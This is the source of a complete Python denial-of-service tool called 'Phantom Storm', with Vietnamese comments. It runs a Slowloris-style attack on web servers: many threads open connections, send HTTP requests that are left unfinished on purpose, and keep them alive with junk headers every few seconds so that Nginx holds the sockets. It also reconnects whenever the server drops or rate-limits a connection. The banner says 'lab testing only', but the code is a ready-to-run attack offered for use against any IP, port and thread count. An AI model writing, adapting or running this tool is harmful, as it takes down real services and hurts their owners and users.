import socket
import threading
import random
import time
import sys

# Khai báo kho chữ lớn ASCII độc quyền cho thương hiệu
def print_banner():
    banner = """
    ____  _   _    _    _   _ _____ ___  __  __   ____ _____ ___  ____  __  __ 

   |  _ \| | | |  / \  | \ | |_   _/ _ \|  \/  | / ___|_   _/ _ \|  _ \|  \/  |
   | |_) | |_| | / _ \ |  \| | | || | | | |\/| | \___ \ | || | | | |_) | |\/| |
   |  __/|  _  |/ ___ \| |\  | | || |_| | |  | |  ___) || || |_| |  _ <|  |  |
   |_|   |_| |_/_/   \_\_| \_| |_| \___/|_|  |_| |____/ |_| \___/|_| \_\_|  |_|
   
                >> [ LAYER 7 HTTP KEEP-ALIVE DOS TOOL ] <<
   ===========================================================================
   [+] Tool Name : Phantom Storm v1.0
   [+] Target    : Internal Network Lab Testing Only
   ===========================================================================
    """
    print(banner)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
]

def attack_worker(target_ip, target_port):
    """Mỗi luồng sẽ mở kết nối và LIÊN TỤC nhồi thêm header rác để giữ kết nối không bị sập"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            
            rand_param = random.randint(1, 99999)
            user_agent = random.choice(USER_AGENTS)
            
            # Gửi phần đầu của HTTP Request nhưng CỐ TÌNH không gửi dấu xuống dòng kết thúc (\r\n\r\n)
            http_request = (
                f"GET /?storm={rand_param} HTTP/1.1\r\n"
                f"Host: www.labpentest.vn\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Connection: keep-alive\r\n"
                f"Keep-Alive: timeout=300, max=100\r\n"
            )
            s.send(http_request.encode('utf-8'))
            
            # SỬA LỖI TẠI ĐÂY: Vòng lặp liên tục "bơm" thêm các Header rác sau mỗi 3 giây 
            # để lừa Nginx tưởng người dùng đang truyền dữ liệu rất chậm, ép Nginx không được ngắt kết nối
            while True:
                time.sleep(3)
                # Gửi thêm một header rác ngẫu nhiên để duy trì trạng thái "đang gửi"
                keep_alive_payload = f"X-Garbage-{random.randint(1,999)}: {random.randint(1,999)}\r\n"
                s.send(keep_alive_payload.encode('utf-8'))
                
        except socket.error:
            # Nếu Nginx chủ động đóng hoặc từ chối (do có Rate Limiting), giải phóng socket cũ và mở cái mới
            try:
                s.close()
            except:
                pass
            time.sleep(0.5)

def main():
    print_banner()
    
    if len(sys.argv) < 4:
        print("Cú pháp sử dụng: python3 phantom_storm.py [IP_Mục_Tiêu] [Cổng] [Số_Luồng]")
        print("Ví dụ:         python3 phantom_storm.py 192.168.1.2 80 150\n")
        sys.exit()

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads_count = int(sys.argv[3])

    print(f"[*] Đang tập kích bão gói tin vào -> {target_ip}:{target_port}")
    print(f"[*] Đang kích hoạt {threads_count} luồng... Nhấn Ctrl + C để rút quân.\n")

    for i in range(threads_count):
        t = threading.Thread(target=attack_worker, args=(target_ip, target_port))
        t.daemon = True 
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Cơn bão đã đi qua. Đã dừng đợt tấn công kiểm thử.")

if __name__ == "__main__":
    main()
